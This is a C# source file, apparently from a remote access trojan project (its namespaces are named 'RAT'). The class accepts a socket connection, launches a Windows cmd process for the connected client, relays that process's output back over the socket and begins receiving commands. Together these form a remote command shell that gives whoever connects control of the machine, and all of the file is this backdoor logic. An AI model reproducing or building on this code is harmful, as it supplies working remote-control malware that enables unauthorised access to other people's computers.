using RAT.src.Cmd;
using RAT.src.Interfaces;
using RAT.src.Models;
using System;
using System.Diagnostics;
using System.Net.Sockets;

namespace RAT.src.Logic.Sockets.Connection
{
    /// <summary>
    /// Logic related to connection acceptance stage.
    /// </summary>
    public class SocketConnectionAcceptLogic : ISocketConnectionAcceptLogic
    {
        private ISocketStateLogic _socketStateLogic { get; }
        private ISocketConnectionReceiveLogic _socketConnectionReceiveLogic { get; }
        private ICmdLogic _cmdLogic { get; }

        /// <summary>
        /// Logic related to connection acceptance stage.
        /// </summary>
        /// <param name="stateLogic">Our client socket state logic.</param>
        /// <param name="receiveLogic">Logic for data receival.</param>
        /// <param name="cmdLogic">Windows cmd logic.</param>
        public SocketConnectionAcceptLogic(
            ISocketStateLogic stateLogic,
            ISocketConnectionReceiveLogic receiveLogic,
            ICmdLogic cmdLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionReceiveLogic = receiveLogic;
            _cmdLogic = cmdLogic;
        }

        /// <summary>
        /// Wrapper for socket accept command.
        /// </summary>
        /// <param name="socket">Socket to accept connection on.</param>
        public void BeginAccept(Socket socket)
        {
            socket.BeginAccept(OnInitialAccept, socket);
        }

        /// <summary>
        /// Socket connection acceptance logic handling.
        /// </summary>
        /// <param name="res">Status of asynchronous operation.</param>
        private void OnInitialAccept(IAsyncResult res)
        {
            // Signal the main thread to continue.
            ManualResetEventWrapper.ResetEvent.Set();

            // Get the socket that handles the client request.
            Socket listener = (Socket)res.AsyncState;
            Socket handler = listener.EndAccept(res);

            // Create the state object with cmd process attached to client.
            // This represents client with all needed information.
            var clientState = new StateObject()
            {
                ClientSocket = handler,
                ClientCmdProcess = new Process()
                {
                    StartInfo = new CmdConfigurator().GetCmdStartupConfiguration(),
                },
            };

            _socketStateLogic.SetState(clientState);

            // Cmd output handler which will redirect output and error result to client after command is executed.
            clientState.ClientCmdProcess.OutputDataReceived += new DataReceivedEventHandler(_cmdLogic.CmdOutputDataHandler);
            clientState.ClientCmdProcess.ErrorDataReceived += new DataReceivedEventHandler(_cmdLogic.CmdOutputDataHandler);

            // Launch cmd process.
            clientState.ClientCmdProcess.Start();
            clientState.ClientCmdProcess.BeginOutputReadLine();
            clientState.ClientCmdProcess.BeginErrorReadLine();

            // We are ready to receive cmd commands.
            _socketConnectionReceiveLogic.BeginCommandReceive(handler);
        }
    }
}